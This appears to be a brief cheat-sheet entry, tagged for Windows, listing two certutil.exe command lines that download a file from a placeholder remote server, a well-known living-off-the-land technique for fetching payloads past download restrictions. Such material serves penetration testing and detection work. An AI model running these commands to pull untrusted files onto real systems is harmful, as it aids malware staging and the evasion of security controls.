# certutil

% windows, download, certutil

## download with certutil
```
certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>
```

## download with  certutil (2)
```
certutil.exe -verifyctl -f -split h http://<server>/<source_file> <dest_file>
```
